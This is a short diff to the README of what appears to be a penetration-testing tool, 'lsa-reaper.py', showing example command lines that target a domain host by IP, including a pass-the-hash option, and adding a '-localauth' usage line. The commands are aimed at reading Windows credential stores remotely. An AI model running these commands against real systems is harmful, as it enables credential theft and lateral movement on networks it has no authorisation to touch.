@@ -60,6 +60,8 @@ sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.10
 sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100
 
 sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100
+
+sudo python3 lsa-reaper.py -localauth localuser@10.0.0.100
 ```
 
 ![](/assets/Reaper-Running.png)
